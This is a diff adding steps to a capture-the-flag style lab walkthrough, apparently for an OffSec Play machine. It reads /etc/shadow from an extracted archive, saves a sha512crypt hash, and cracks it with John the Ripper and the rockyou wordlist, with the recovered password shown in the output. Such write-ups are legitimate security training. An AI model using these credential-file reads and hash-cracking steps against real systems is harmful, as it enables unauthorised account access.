@@ -173,3 +173,32 @@ Archive:  save.zip
  extracting: etc/hostname 
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/23eb7457-c8da-451a-9669-b5ca0dc29723)
+
+```shell
+> cd etc
+> ls -lah
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/99024b6e-1de5-4cfa-812c-a7f63d513f8e)
+
+```shell
+> cat shadow
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/a4f26b74-9050-4cfa-bc19-ac3d9dca3158)
+
+```shell
+echo "296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us. > user.hash
+```
+Crack the Hash
+```shell
+> john --wordlist=/usr/share/wordlists/rockyou.txt user.hash
+> john --wordlist=/usr/share/wordlists/rockyou.txt user.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+server           (296640a3b825115a47b68fc44501c828)     
+1g 0:00:00:06 DONE (2023-10-20 04:32) 0.1560g/s 2675p/s 2675c/s 2675C/s felton..Hunter
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
